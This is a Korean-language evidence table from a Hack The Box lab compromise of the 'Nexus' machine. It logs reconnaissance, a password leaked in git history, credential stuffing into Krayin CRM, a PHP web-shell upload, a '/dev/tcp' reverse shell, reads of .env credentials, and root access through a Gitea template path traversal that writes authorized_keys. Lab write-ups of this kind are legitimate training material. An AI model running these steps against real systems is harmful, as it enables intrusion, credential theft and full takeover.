# 증적 목록 — HTB Nexus (10.129.12.96)

| ID | 시각(KST) | 단계 | 명령/요청 | 파일 경로 | 핵심 확인 내용 | 민감도 | 상태 |
|----|-----------|------|-----------|-----------|-----------------|--------|------|
| E01 | 2026-08-24 14:35 | 포트 스캔 | `nmap -p- --min-rate 3000 -T4 -Pn` | `scans/E01_nmap_full_tcp.*` | 22/tcp, 80/tcp open | 낮음 | 확인됨 |
| E02 | 2026-08-24 14:35 | 서비스 버전 스캔 | `nmap -sC -sV -p22,80` | `scans/E02_nmap_sv.*` | OpenSSH 9.6p1, nginx 1.24.0, `nexus.htb` 리다이렉트 | 낮음 | 확인됨 |
| E03 | 2026-08-24 14:35 | 웹 정찰 | `curl --resolve nexus.htb:80:$TARGET` | `http/E03_index.html` | "Nexus Energy Authority" 랜딩 페이지, 채용공고(Operations Specialist – Customer Platforms) | 낮음 | 확인됨 |
| E04 | 2026-08-24 14:40 | vhost 퍼징 | `ffuf -H "Host: FUZZ.nexus.htb"` (subdomains-top1million-5000) | `scans/E04_ffuf_vhost.json` | `billing.nexus.htb`(302→/admin/login), `git.nexus.htb`(200, Gitea) 발견 | 낮음 | 확인됨 |
| E05 | 2026-08-24 14:44 | Gitea 확인 | `curl -H "Host: git.nexus.htb"` | `http/E05_git_index.html` | Gitea 인스턴스, `i_like_gitea` 쿠키 | 낮음 | 확인됨 |
| E06 | 2026-08-24 14:44 | Gitea API 열거 | `GET /api/v1/repos/search`, `/api/v1/users/search` | `http/E06_git_repos.json` | 공개 저장소 `admin/krayin-docker-setup`, 사용자 `admin`, `jones` | 낮음 | 확인됨 |
| E07 | 2026-08-24 14:45 | 저장소 클론 | `git clone http://.../admin/krayin-docker-setup.git` | `artifacts/krayin-docker-setup/` | 저장소 획득, 2개 커밋 확인 | 낮음 | 확인됨 |
| — | 2026-08-24 14:45 | git 히스토리 분석 | `git show 1615c46:.env` | `artifacts/krayin-docker-setup/.git` | 이전 커밋에 평문 `DB_PASSWORD=N27xh!!2ucY04` 노출 (이후 커밋에서 삭제됨) | **높음(자격증명)** | 확인됨 |
| E08 | 2026-08-24 14:45 | 로그인 페이지 확인 | `curl -H "Host: billing.nexus.htb" /admin/login` | `http/E08_billing_login.html` | Krayin CRM 로그인 폼(Laravel, `_token` CSRF) | 낮음 | 확인됨 |
| E09–E10 | 2026-08-24 14:47 | 자격증명 대입 | `POST /admin/login` (email 후보 5개 × 유출 비밀번호) | `scripts/E09_login_attempt.sh`, `scripts/E10_login_bruteforce.sh` | `j.matthew@nexus.htb` / `N27xh!!2ucY04` → `/admin/dashboard` 리다이렉트(로그인 성공) | **높음(자격증명)** | 확인됨 |
| E11–E13 | 2026-08-24 14:47–14:49 | 세션 유지 검증 | 로그인 후 `/admin/dashboard` 재요청 | `http/E11_dashboard.html`, `http/E13_dashboard.html`, `loot/E13_cookies.txt` | 동일 쿠키잔(cookie jar)로 200 OK 응답, 인증 세션 확인 | 중간(세션 쿠키) | 확인됨 |
| E14 | 2026-08-24 14:49 | 기능 탐색 | `/admin/leads/create`, `/admin/mail/inbox` | `http/E14_leads_create.html`, `http/E14_leads_list.html` | TinyMCE 리치에디터 로드 확인(`tinymce/6.6.2`), PHP 8.3.6/Laravel 12.54.1(phpdebugbar 노출) | 낮음 | 확인됨 |
| — | 2026-08-24 15:00 | 외부 검증 | WebSearch/WebFetch (공개 CVE 자료) | (본문 §16 참고자료) | `CVE-2026-38526`: Krayin CRM v2.2.x 인증된 임의 파일 업로드 → RCE, CVSS 9.9 | 낮음 | 외부 검증됨 |
| E15 | 2026-08-24 15:07 | RCE 익스플로잇 | `POST /admin/tinymce/upload` (필드 `file`, `_token`, `Content-Type: image/jpeg` 위장, `.php` 확장자) | `scripts/E15_pyupload.py` | HTTP 200, `{"location":"http://billing.nexus.htb/storage/tinymce/165692c372f25edec5a06388f7c30ec5.php"}` | **높음(웹셸)** | 확인됨 |
| — | 2026-08-24 15:07 | 코드 실행 검증 | `GET /storage/tinymce/165692....php?cmd=id` | (본문 §7 참고) | `uid=33(www-data) gid=33(www-data) groups=33(www-data)` | 중간 | 확인됨 |
| E15b–c | 2026-08-24 15:07 | 리버스 셸 | `bash -i >& /dev/tcp/$LHOST/4444 0>&1` | `scripts/E15b_revshell_trigger.py`, `loot/E15c_revshell_session.log` | 대화형 `www-data` 셸 확보 | **높음(셸 세션)** | 확인됨 |
| — | 2026-08-24 15:08 | 자격증명 재확보 | `cat /var/www/krayin/.env` (실제 배포본) | `loot/E15c_revshell_session.log` | 실제 `DB_PASSWORD=y27xb3ha!!74GbR` (git 히스토리 값과 다름) | **높음(자격증명)** | 확인됨 |
| E16 | 2026-08-24 15:09 | 자격증명 재사용 검증 | Gitea `/user/login` (jones × 2개 후보 비밀번호) | `scripts/E16_gitea_login_test.py` | `jones` / `y27xb3ha!!74GbR` → 303 리다이렉트, `i_like_gitea` 세션 쿠키 발급(로그인 성공) | **높음(자격증명)** | 확인됨 |
| — | 2026-08-24 15:10 | 권한상승 표면 확인 | `cat /etc/gitea/template-sync.py`, `systemctl list-timers` (www-data 셸) | `loot/E15c_revshell_session.log` | `gitea-template-sync.timer`(매분) → root 권한 `template-sync.py` 실행, `os.path.join(stage_path, filepath)` 경로 미검증 확인 | 중간 | 확인됨 |
| E17 | 2026-08-24 15:15 | Git 저장소 생성 및 template 플래그 설정 | `POST /api/v1/user/repos` (`"template":true`) | `scripts/E17_gitea_path_traversal_exploit.sh` | 저장소 `jones/sitetemplate` 생성, `template:true` 확인(API 응답) | 낮음 | 확인됨 |
| — | 2026-08-24 15:17 | 악성 git 오브젝트 구성/푸시 | `git hash-object`, `git mktree`(중첩 5단계), `git commit-tree`, `git push --force` | `scripts/E17_gitea_path_traversal_exploit.sh` | `git ls-tree -r HEAD` → `../../../../../root/.ssh/authorized_keys` 경로의 blob 확인, 원격 저장소에 push 성공 | **높음(공격 페이로드)** | 확인됨 |
| E18 | 2026-08-24 15:17 | 공격용 키 생성 | `ssh-keygen -t ed25519` | `loot/E18_root_ssh_pubkey.pub` | 공격자 공개키 생성(개인키는 로컬 kali WSL에만 보관, 문서화하지 않음) | 낮음 | 확인됨 |
| E19b | 2026-08-24 15:30 | 네트워크 진단 | `tcpdump -i tun0 host $TARGET and port 22` | `loot/E19b_ssh_mtu_diagnostic.pcap` | 클라이언트→서버 방향 1148바이트 초과 TCP 세그먼트가 반복 유실(ICMP PMTUD 차단 추정), 서버 SACK으로 확인 | 낮음(네트워크 진단) | 확인됨 |
| E19–E20 | 2026-08-24 15:30 | Root 권한 검증 | `ssh -i nexus_root root@$TARGET` (`tun0` MTU 576로 하향 후) | `scripts/E19_ssh_root_paramiko.py`, `loot/E20_root_flags_and_id.txt` | `uid=0(root) gid=0(root) groups=0(root)`, `hostname=nexus`, root/user 플래그 직접 확인 | **높음(플래그)** | 확인됨 |

## 자료 간 불일치

- git 히스토리에서 유출된 `.env`의 `DB_PASSWORD`(`N27xh!!2ucY04`, 커밋 `1615c46`)와 실제 배포된 `/var/www/krayin/.env`의 `DB_PASSWORD`(`y27xb3ha!!74GbR`)는 **서로 다른 값**이다. 전자는 CRM 관리자 계정(`j.matthew@nexus.htb`) 로그인에, 후자는 Gitea `jones` 계정 로그인(자격증명 재사용)에 각각 유효했다. 두 값을 혼동하지 않도록 본문에서 각 값의 용도를 명시했다.
